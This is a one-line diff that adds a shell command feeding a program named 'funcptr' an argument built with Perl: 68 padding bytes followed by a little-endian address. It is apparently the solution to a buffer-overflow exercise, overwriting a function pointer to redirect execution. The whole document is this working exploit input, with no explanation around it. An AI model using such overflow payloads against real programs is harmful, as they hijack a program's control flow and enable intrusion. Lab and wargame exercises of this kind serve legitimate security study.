@@ -1,0 +1,1 @@
+./funcptr `perl -e 'print "A"x68; print "\x40\x83\x04\x08"'`
